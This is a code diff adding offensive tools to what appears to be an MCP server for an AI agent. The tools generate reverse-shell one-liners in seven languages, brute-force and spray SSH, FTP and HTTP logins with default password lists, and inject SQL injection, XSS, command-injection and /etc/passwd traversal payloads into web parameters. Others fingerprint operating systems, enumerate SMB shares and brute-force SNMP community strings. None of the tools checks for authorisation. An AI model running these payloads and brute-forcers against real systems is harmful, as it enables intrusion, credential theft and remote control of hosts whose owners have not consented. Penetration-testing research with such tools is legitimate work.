+    return f"Unknown hash type\nLength: {length}\nHex: {is_hex}"
+
+
+# ── Exploitation Tools ──
+
+
+@mcp_server.tool()
+def generate_reverse_shell(
+    payload_type: str = "bash",
+    lport: int = 4444,
+) -> str:
+    """
+    Generate reverse shell payloads for different languages.
+
+    Creates the command that would be run on a compromised target to
+    connect back to your listener. Use with the standalone revshell.py
+    handler.
+
+    Args:
+        payload_type: Language/tool for payload. Options: bash, python,
+                      nc, php, ruby, perl, powershell, all
+        lport: Your listener port (default 4444)
+    """
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        lhost = s.getsockname()[0]
+        s.close()
+    except Exception:
+        lhost = "YOUR_IP"
+
+    payloads = {
+        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "python": (
+            f"python3 -c 'import socket,subprocess,os;"
+            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            f"s.connect((\"{lhost}\",{lport}));"
+            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
+        ),
+        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "ruby": f"ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "perl": (
+            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
+            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
+            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'"
+        ),
+        "powershell": (
+            f"powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
+            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+            f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding)"
+            f".GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
+            f"$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};"
+            f"$c.Close()\""
+        ),
+    }
+
+    lines = [f"Reverse Shell Payloads → {lhost}:{lport}", ""]
+
+    if payload_type == "all":
+        for name, payload in payloads.items():
+            lines.append(f"[{name}]")
+            lines.append(payload)
+            lines.append("")
+    elif payload_type in payloads:
+        lines.append(f"[{payload_type}]")
+        lines.append(payloads[payload_type])
+    else:
+        lines.append(f"Unknown type. Available: {', '.join(payloads.keys())}, all")
+
+    lines.append(f"\nStart your listener: python3 revshell.py -p {lport}")
+
+    return "\n".join(lines)
+
+
+# ── Credential Spraying ──
+
+
+@mcp_server.tool()
+def credential_spray(
+    service: str,
+    target: str,
+    username: str | None = None,
+    password: str | None = None,
+    port: int | None = None,
+    spray_mode: bool = False,
+    threads: int = 5,
+    timeout: float = 5.0,
+) -> str:
+    """
+    Attempt to brute-force or spray credentials against a service.
+
+    Supports SSH, FTP, and HTTP Basic Auth. Uses built-in default
+    credential lists if none specified.
+
+    Args:
+        service: Service type — "ssh", "ftp", or "http-basic"
+        target: Target IP or URL
+        username: Single username to try (uses defaults if not set)
+        password: Single password to try (uses defaults if not set)
+        port: Service port (auto-detected if not set)
+        spray_mode: If True, try one password across all users (avoids lockouts)
+        threads: Concurrent threads (default 5, keep low for SSH)
+        timeout: Connection timeout in seconds
+    """
+    import ftplib
+    import base64
+    import urllib.request
+    import urllib.error
+    from concurrent.futures import ThreadPoolExecutor, as_completed as asc
+    import time
+
+    default_users = [
+        "admin", "root", "user", "test", "guest", "administrator",
+        "ubuntu", "deploy", "jenkins", "git", "ftp", "backup",
+    ]
+    default_passwords = [
+        "", "password", "admin", "root", "123456", "changeme",
+        "default", "letmein", "welcome", "password1", "password123",
+        "admin123", "root123", "test", "test123", "p@ssw0rd",
+        "P@ssword1", "Admin123!", "guest", "1234567890",
+    ]
+
+    users = [username] if username else default_users
+    passwords = [password] if password else default_passwords
+    default_ports = {"ssh": 22, "ftp": 21, "http-basic": 80}
+    if port is None:
+        port = default_ports.get(service, 22)
+
+    found = []
+    attempts = 0
+    start = time.time()
+
+    def try_ftp(u, p):
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(target, port, timeout=timeout)
+            ftp.login(u, p)
+            ftp.quit()
+            return True
+        except Exception:
+            return False
+
+    def try_http_basic(u, p):
+        creds = base64.b64encode(f"{u}:{p}".encode()).decode()
+        try:
+            req = urllib.request.Request(target)
+            req.add_header("Authorization", f"Basic {creds}")
+            urllib.request.urlopen(req, timeout=timeout)
+            return True
+        except urllib.error.HTTPError as e:
+            return e.code != 401
+        except Exception:
+            return False
+
+    def try_ssh(u, p):
+        try:
+            import paramiko
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(target, port=port, username=u, password=p,
+                           timeout=timeout, allow_agent=False, look_for_keys=False)
+            client.close()
+            return True
+        except Exception:
+            return False
+
+    try_func = {"ssh": try_ssh, "ftp": try_ftp, "http-basic": try_http_basic}
+    if service not in try_func:
+        return f"Unknown service: {service}. Use: ssh, ftp, http-basic"
+    func = try_func[service]
+
+    if spray_mode:
+        pairs = [(u, p) for p in passwords for u in users]
+    else:
+        pairs = [(u, p) for u in users for p in passwords]
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {}
+        for u, p in pairs:
+            futures[executor.submit(func, u, p)] = (u, p)
+
+        for f in asc(futures):
+            u, p = futures[f]
+            attempts += 1
+            if f.result():
+                found.append({"user": u, "password": p})
+
+    duration = time.time() - start
+
+    lines = [
+        f"Credential Spray: {service}://{target}:{port}",
+        f"Attempts: {attempts}",
+        f"Duration: {duration:.1f}s",
+        "",
+    ]
+
+    if found:
+        lines.append("VALID CREDENTIALS FOUND:")
+        for cred in found:
+            lines.append(f"  {cred['user']}:{cred['password']}")
+    else:
+        lines.append("No valid credentials found.")
+
+    return "\n".join(lines)
+
+
+# ── Vulnerability Scanning ──
+
+
+@mcp_server.tool()
+def vuln_scan(
+    url: str,
+    tests: str = "all",
+    timeout: float = 10.0,
+) -> str:
+    """
+    Scan a web URL for common vulnerabilities: SQL injection, XSS,
+    command injection, LFI, and security header issues.
+
+    Provide a URL with parameters to test (e.g., http://target.com/page?id=1).
+    Without parameters, only header checks are performed.
+
+    Args:
+        url: Target URL, ideally with parameters to test
+        tests: Comma-separated tests to run: sqli,xss,cmdi,lfi,headers,all
+               (default: all)
+        timeout: Request timeout in seconds
+    """
+    import urllib.request
+    import urllib.error
+    import urllib.parse
+    import re
+
+    test_list = [t.strip() for t in tests.split(",")]
+    if "all" in test_list:
+        test_list = ["sqli", "xss", "cmdi", "lfi", "headers"]
+
+    all_findings = []
+
+    def _fetch(u):
+        try:
+            req = urllib.request.Request(u)
+            req.add_header("User-Agent", "Mozilla/5.0")
+            resp = urllib.request.urlopen(req, timeout=timeout)
+            return resp.status, dict(resp.headers), resp.read().decode("utf-8", errors="ignore")
+        except urllib.error.HTTPError as e:
+            body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
+            return e.code, dict(e.headers), body
+        except Exception:
+            return 0, {}, ""
+
+    def _inject(u, param, payload):
+        parsed = urllib.parse.urlparse(u)
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        if param not in params:
+            return u
+        params[param] = [payload]
+        return urllib.parse.urlunparse(parsed._replace(
+            query=urllib.parse.urlencode(params, doseq=True)))
+
+    if "headers" in test_list:
+        _, headers, _ = _fetch(url)
+        sec_headers = {
+            "Strict-Transport-Security": "HIGH",
+            "Content-Security-Policy": "HIGH",
+            "X-Frame-Options": "MEDIUM",
+            "X-Content-Type-Options": "LOW",
+        }
+        for h, sev in sec_headers.items():
+            if h.lower() not in {k.lower() for k in headers}:
+                all_findings.append(f"[{sev}] Missing {h}")
+
+        server = headers.get("Server", "")
+        if server:
+            all_findings.append(f"[LOW] Server header discloses: {server}")
+        xpb = headers.get("X-Powered-By", "")
+        if xpb:
+            all_findings.append(f"[LOW] X-Powered-By discloses: {xpb}")
+
+    parsed = urllib.parse.urlparse(url)
+    params = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())
+
+    if not params:
+        lines = [f"Vulnerability Scan: {url}", ""]
+        if all_findings:
+            lines.extend(all_findings)
+        else:
+            lines.append("No URL parameters found to test injection points.")
+            lines.append("Provide a URL like: http://target.com/page?id=1")
+        return "\n".join(lines)
+
+    sqli_errors = [
+        r"sql syntax", r"mysql", r"sqlite", r"postgresql",
+        r"ORA-\d+", r"SQLSTATE", r"database error",
+        r"Warning.*\Wmysqli?_", r"Warning.*\Wpg_",
+    ]
+    xss_payloads = [
+        '<script>alert(1)</script>',
+        '"><img src=x onerror=alert(1)>',
+        "{{7*7}}",
+    ]
+    cmdi_payloads = ["; id", "| id", "$(id)"]
+    cmdi_indicators = [r"uid=\d+", r"root:.*:0:0:"]
+    lfi_payloads = ["../../../etc/passwd", "....//....//....//etc/passwd"]
+
+    for param in params:
+        if "sqli" in test_list:
+            for payload in ["'", "' OR '1'='1", "' UNION SELECT NULL--"]:
+                test_url = _inject(url, param, payload)
+                _, _, body = _fetch(test_url)
+                for pat in sqli_errors:
+                    if re.search(pat, body, re.IGNORECASE):
+                        all_findings.append(
+                            f"[CRITICAL] SQL Injection in '{param}' "
+                            f"— payload: {payload} — evidence: {re.search(pat, body, re.IGNORECASE).group()}")
+                        break
+
+        if "xss" in test_list:
+            for payload in xss_payloads:
+                test_url = _inject(url, param, payload)
+                _, _, body = _fetch(test_url)
+                if payload in body:
+                    all_findings.append(
+                        f"[HIGH] Reflected XSS in '{param}' — payload reflected unescaped")
+                    break
+                if payload == "{{7*7}}" and "49" in body:
+                    all_findings.append(
+                        f"[CRITICAL] Template Injection in '{param}' — {{{{7*7}}}} = 49")
+                    break
+
+        if "cmdi" in test_list:
+            for payload in cmdi_payloads:
+                test_url = _inject(url, param, payload)
+                _, _, body = _fetch(test_url)
+                for pat in cmdi_indicators:
+                    if re.search(pat, body, re.IGNORECASE):
+                        all_findings.append(
+                            f"[CRITICAL] Command Injection in '{param}' — payload: {payload}")
+                        break
+
+        if "lfi" in test_list:
+            for payload in lfi_payloads:
+                test_url = _inject(url, param, payload)
+                _, _, body = _fetch(test_url)
+                if re.search(r"root:.*:0:0:", body):
+                    all_findings.append(
+                        f"[CRITICAL] LFI in '{param}' — /etc/passwd readable")
+                    break
+
+    lines = [
+        f"Vulnerability Scan: {url}",
+        f"Parameters tested: {', '.join(params)}",
+        f"Tests run: {', '.join(test_list)}",
+        "",
+    ]
+
+    if all_findings:
+        for f in all_findings:
+            lines.append(f"  {f}")
+        lines.append(f"\n{len(all_findings)} findings total")
+    else:
+        lines.append("No vulnerabilities detected.")
+
+    return "\n".join(lines)
+
+
+# ── OS Fingerprinting ──
+
+
+@mcp_server.tool()
+def os_fingerprint(
+    target: str,
+    passive_only: bool = False,
+    timeout: float = 3.0,
+) -> str:
+    """
+    Identify the operating system of a remote host by analyzing TCP/IP
+    stack behavior, ICMP responses, and service banners.
+
+    Active mode (default) sends TCP SYN probes and ICMP packets (needs sudo).
+    Passive mode only grabs service banners (no root needed).
+
+    Args:
+        target: Target IP address
+        passive_only: If True, only grab banners (no raw packet probes)
+        timeout: Timeout per probe in seconds
+    """
+    import re
+
+    TTL_SIGS = {(0, 64): "Linux/Unix/macOS", (65, 128): "Windows", (129, 255): "Cisco/Network Device"}
+    WINDOW_SIGS = {
+        5840: "Linux 2.4/2.6", 8192: "Windows XP/2003", 65535: "Windows 7+/macOS",
+        64240: "Linux 4.x/5.x", 29200: "Linux 3.x", 32768: "Cisco IOS",
+    }
+
+    candidates = {}
+
+    def vote(os_name, confidence, source):
+        if os_name and os_name != "Unknown":
+            candidates.setdefault(os_name, []).append({"c": confidence, "s": source})
+
+    for port, service in [(22, "SSH"), (80, "HTTP"), (443, "HTTPS"), (8080, "HTTP-Alt")]:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((target, port))
+
+            if service == "SSH":
+                banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
+                s.close()
+                if "Ubuntu" in banner: vote("Ubuntu Linux", 90, f"SSH: {banner[:60]}")
+                elif "Debian" in banner: vote("Debian Linux", 90, f"SSH: {banner[:60]}")
+                elif "OpenSSH_for_Windows" in banner: vote("Windows", 90, f"SSH: {banner[:60]}")
+                elif "OpenSSH" in banner: vote("Linux/Unix", 75, f"SSH: {banner[:60]}")
+            else:
+                s.send(f"HEAD / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
+                resp = s.recv(4096).decode("utf-8", errors="ignore")
+                s.close()
+                for line in resp.split("\r\n"):
+                    if line.lower().startswith("server:"):
+                        server = line.split(":", 1)[1].strip()
+                        if "IIS" in server: vote("Windows Server", 85, f"HTTP: {server}")
+                        elif "Ubuntu" in server: vote("Ubuntu Linux", 85, f"HTTP: {server}")
+                        elif "Debian" in server: vote("Debian Linux", 85, f"HTTP: {server}")
+                        elif "Apache" in server: vote("Linux (likely)", 60, f"HTTP: {server}")
+                        elif "nginx" in server: vote("Linux (likely)", 55, f"HTTP: {server}")
+                        break
+        except Exception:
+            continue
+
+    if not passive_only:
+        for probe_port in [80, 443, 22, 8080, 21]:
+            syn = IP(dst=target) / TCP(dport=probe_port, flags="S",
+                options=[("MSS", 1460), ("SAckOK", b""), ("Timestamp", (12345, 0)),
+                         ("NOP", None), ("WScale", 7)])
+            resp = sr1(syn, timeout=timeout)
+            if resp and resp.haslayer(TCP):
+                ttl = resp[IP].ttl
+                win = resp[TCP].window
+                for (lo, hi), name in TTL_SIGS.items():
+                    if lo <= ttl <= hi:
+                        vote(name, 60, f"TTL={ttl}")
+                        break
+                if win in WINDOW_SIGS:
+                    vote(WINDOW_SIGS[win], 70, f"Window={win}")
+                elif any(abs(win - k) < 1000 for k in WINDOW_SIGS):
+                    closest = min(WINDOW_SIGS, key=lambda k: abs(k - win))
+                    vote(WINDOW_SIGS[closest], 55, f"Window={win} (~{closest})")
+                sr1(IP(dst=target) / TCP(dport=probe_port, sport=resp[TCP].dport,
+                    flags="R", seq=resp[TCP].ack), timeout=1)
+                break
+
+        ping = IP(dst=target) / ICMP(type=8) / Raw(load=b"A" * 32)
+        reply = sr1(ping, timeout=timeout)
+        if reply and reply.haslayer(ICMP):
+            for (lo, hi), name in TTL_SIGS.items():
+                if lo <= reply[IP].ttl <= hi:
+                    vote(name, 50, f"Ping TTL={reply[IP].ttl}")
+                    break
+
+    scored = {}
+    for os_name, votes in candidates.items():
+        total = sum(v["c"] for v in votes)
+        sources = [v["s"] for v in votes]
+        scored[os_name] = {"score": total, "sources": sources}
+    scored = dict(sorted(scored.items(), key=lambda x: -x[1]["score"]))
+
+    lines = [f"OS Fingerprint: {target}", f"Mode: {'Passive' if passive_only else 'Active'}", ""]
+    if scored:
+        for os_name, info in scored.items():
+            lines.append(f"  {info['score']:>3}  {os_name}")
+            for src in info["sources"]:
+                lines.append(f"       └─ {src}")
+        best = list(scored.keys())[0]
+        lines.append(f"\nBest guess: {best} (score: {scored[best]['score']})")
+    else:
+        lines.append("Could not determine OS. Target may be firewalled.")
+
+    return "\n".join(lines)
+
+
+# ── SMB Enumeration ──
+
+
+@mcp_server.tool()
+def smb_enum(
+    target: str,
+    timeout: float = 5.0,
+) -> str:
+    """
+    Enumerate SMB (Windows file sharing) on a target. Discovers shares,
+    OS version, SMB version, signing config, and checks for known vulns.
+
+    Args:
+        target: Target IP address
+        timeout: Connection timeout in seconds
+    """
+    import struct as st
+    import subprocess
+
+    lines = [f"SMB Enumeration: {target}", ""]
+
+    smb_port = None
+    for port in [445, 139]:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            if s.connect_ex((target, port)) == 0:
+                smb_port = port
+            s.close()
+            if smb_port:
+                break
+        except Exception:
+            pass
+
+    if not smb_port:
+        lines.append("SMB ports (445, 139) are not open.")
+        return "\n".join(lines)
+
+    lines.append(f"SMB open on port {smb_port}")
+
+    SMB1_NEG = (
+        b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
+        b"\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x62\x00\x02"
+        b"PC NETWORK PROGRAM 1.0\x00\x02LANMAN1.0\x00\x02"
+        b"Windows for Workgroups 3.1a\x00\x02LM1.2X002\x00"
+        b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
+    )
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((target, smb_port))
+        s.send(SMB1_NEG)
+        resp = s.recv(4096)
+        s.close()
+
+        if resp[4:8] == b"\xff\x53\x4d\x42":
+            lines.append("SMB Version: SMB1")
+            lines.append("[HIGH] SMB1 enabled — vulnerable to EternalBlue (CVE-2017-0144)")
+            if len(resp) > 39:
+                signing = "Required" if resp[39] & 0x08 else "Optional"
+                lines.append(f"Signing: {signing}")
+                if signing == "Optional":
+                    lines.append("[MEDIUM] SMB signing not required — relay attacks possible")
+        elif resp[4:8] == b"\xfe\x53\x4d\x42":
+            lines.append("SMB Version: SMB2/3")
+            if len(resp) > 72:
+                dialect = st.unpack_from("<H", resp, 72)[0]
+                dialect_map = {0x0202: "2.0.2", 0x0210: "2.1", 0x0300: "3.0",
+                               0x0302: "3.0.2", 0x0311: "3.1.1"}
+                lines.append(f"Dialect: SMB {dialect_map.get(dialect, hex(dialect))}")
+            if len(resp) > 70:
+                signing = "Required" if st.unpack_from("<H", resp, 70)[0] & 0x02 else "Optional"
+                lines.append(f"Signing: {signing}")
+                if signing == "Optional":
+                    lines.append("[MEDIUM] SMB signing not required — relay attacks possible")
+    except Exception as e:
+        lines.append(f"Negotiate failed: {e}")
+
+    try:
+        result = subprocess.run(
+            ["smbclient", "-L", f"//{target}", "-N"],
+            capture_output=True, text=True, timeout=int(timeout) + 5,
+        )
+        output = result.stdout + result.stderr
+
+        if "Anonymous login successful" in output:
+            lines.append("\n[HIGH] Anonymous/null session login allowed")
+
+        shares = []
+        in_shares = False
+        for line in output.splitlines():
+            line = line.strip()
+            if "Sharename" in line and "Type" in line:
+                in_shares = True
+                continue
+            if line.startswith("---"):
+                continue
+            if not line or "Reconnecting" in line:
+                in_shares = False
+                continue
+            if in_shares:
+                parts = line.split()
+                if len(parts) >= 2:
+                    shares.append({"name": parts[0], "type": parts[1],
+                                   "comment": " ".join(parts[2:])})
+
+        if shares:
+            lines.append(f"\nShares ({len(shares)}):")
+            for sh in shares:
+                flag = ""
+                if sh["name"].lower() in ["admin$", "c$", "ipc$"]:
+                    flag = " (default admin)"
+                elif not sh["name"].endswith("$"):
+                    flag = " ← check access"
+                lines.append(f"  {sh['name']:<25} {sh['type']:<8} {sh['comment']}{flag}")
+
+    except FileNotFoundError:
+        lines.append("\nsmbclient not installed — install with: brew install samba")
+    except Exception:
+        pass
+
+    return "\n".join(lines)
+
+
+# ── SNMP Scanning ──
+
+
+@mcp_server.tool()
+def snmp_scan(
+    target: str,
+    community: str = "public",
+    brute_force: bool = False,
+    walk: bool = False,
+    timeout: float = 3.0,
+) -> str:
+    """
+    Query a device via SNMP to extract system info, network config,
+    and more. Can brute-force community strings.
+
+    SNMP with default "public" community string is extremely common
+    on routers, switches, printers, and IoT devices.
+
+    Args:
+        target: Target IP address
+        community: SNMP community string (default: "public")
+        brute_force: If True, try common community strings
+        walk: If True, do a full SNMP walk (verbose output)
+        timeout: Timeout per query in seconds
+    """
+    def _encode_len(n):
+        return bytes([n]) if n < 0x80 else bytes([0x81, n]) if n < 0x100 else bytes([0x82, (n >> 8) & 0xff, n & 0xff])
+
+    def _encode_int(v):
+        d = b"\x00" if v == 0 else v.to_bytes((v.bit_length() + 8) // 8, "big", signed=True)
+        return b"\x02" + _encode_len(len(d)) + d
+
+    def _encode_str(v):
+        d = v.encode() if isinstance(v, str) else v
+        return b"\x04" + _encode_len(len(d)) + d
+
+    def _encode_oid(oid_str):
+        parts = [int(x) for x in oid_str.split(".") if x]
+        if len(parts) < 2: parts = [1, 3] + parts
+        enc = bytes([parts[0] * 40 + parts[1]])
+        for p in parts[2:]:
+            if p < 128: enc += bytes([p])
+            else:
+                t = []
+                t.append(p & 0x7f); p >>= 7
+                while p: t.append(0x80 | (p & 0x7f)); p >>= 7
+                enc += bytes(reversed(t))
+        return b"\x06" + _encode_len(len(enc)) + enc
+
+    def _encode_seq(d): return b"\x30" + _encode_len(len(d)) + d
+
+    def _build_get(comm, oid):
+        vb = _encode_seq(_encode_oid(oid) + b"\x05\x00")
+        vbl = _encode_seq(vb)
+        pdu = _encode_int(1) + _encode_int(0) + _encode_int(0) + vbl
+        pdu_enc = b"\xa0" + _encode_len(len(pdu)) + pdu
+        msg = _encode_int(0) + _encode_str(comm) + pdu_enc
+        return _encode_seq(msg)
+
+    def _decode_response(data):
+        try:
+            if data[0] != 0x30: return None, None
+            off = 2 if data[1] < 0x80 else (3 if data[1] == 0x81 else 4)
+            content = data[off:]
+            i = 0
+            for _ in range(2):
+                tl = 2 if content[i+1] < 0x80 else (3 if content[i+1] == 0x81 else 4)
+                vlen = content[i+1] if content[i+1] < 0x80 else (content[i+2] if content[i+1] == 0x81 else (content[i+2] << 8 | content[i+3]))
+                i += tl + vlen
+            if content[i] != 0xa2: return None, None
+            raw = content[i:]
+            for j in range(len(raw) - 1):
+                if raw[j] == 0x06:
+                    oid_len = raw[j+1]
+                    val_start = j + 2 + oid_len
+                    if val_start < len(raw):
+                        val_tag = raw[val_start]
+                        val_len = raw[val_start + 1] if val_start + 1 < len(raw) else 0
+                        val_data = raw[val_start + 2:val_start + 2 + val_len]
+                        if val_tag == 0x04:
+                            return "string", val_data.decode("utf-8", errors="replace")
+                        elif val_tag == 0x02:
+                            return "int", int.from_bytes(val_data, "big", signed=True)
+                        elif val_tag == 0x43:
+                            ticks = int.from_bytes(val_data, "big")
+                            s = ticks // 100
+                            return "time", f"{s//86400}d {(s%86400)//3600}h {(s%3600)//60}m"
+                        elif val_tag == 0x40:
+                            return "ip", ".".join(str(b) for b in val_data)
+                        elif val_tag in (0x41, 0x42, 0x46):
+                            return "int", int.from_bytes(val_data, "big")
+                        elif val_tag in (0x80, 0x81, 0x82):
+                            return None, None
+            return None, None
+        except Exception:
+            return None, None
+
+    def _snmp_get(comm, oid):
+        pkt = _build_get(comm, oid)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(timeout)
+            sock.sendto(pkt, (target, 161))
+            data, _ = sock.recvfrom(65535)
+            sock.close()
+            _, val = _decode_response(data)
+            return val
+        except Exception:
+            return None
+
+    lines = [f"SNMP Scan: {target}", ""]
+
+    if brute_force:
+        communities = [
+            "public", "private", "community", "snmp", "monitor",
+            "manager", "admin", "default", "read", "write",
+            "secret", "cisco", "internal", "test", "guest",
+        ]
+        lines.append("Brute-forcing community strings:")
+        found = []
+        for comm in communities:
+            val = _snmp_get(comm, "1.3.6.1.2.1.1.1.0")
+            if val is not None:
+                found.append(comm)
+                lines.append(f"  [+] '{comm}' — {str(val)[:80]}")
+        if not found:
+            lines.append("  No valid community strings found.")
+        return "\n".join(lines)
+
+    oids = {
+        "1.3.6.1.2.1.1.1.0": "sysDescr",
+        "1.3.6.1.2.1.1.2.0": "sysObjectID",
+        "1.3.6.1.2.1.1.3.0": "sysUpTime",
+        "1.3.6.1.2.1.1.4.0": "sysContact",
+        "1.3.6.1.2.1.1.5.0": "sysName",
+        "1.3.6.1.2.1.1.6.0": "sysLocation",
+    }
+
+    any_response = False
+    for oid, name in oids.items():
+        val = _snmp_get(community, oid)
+        if val is not None:
+            any_response = True
+            lines.append(f"  {name:<15} {str(val)[:100]}")
+
+    if not any_response:
+        lines.append(f"No response with community '{community}'.")
+        lines.append("Try --brute_force=true or a different community string.")
+
+    return "\n".join(lines)
+
+
+if __name__ == "__main__":
+    mcp_server.run()
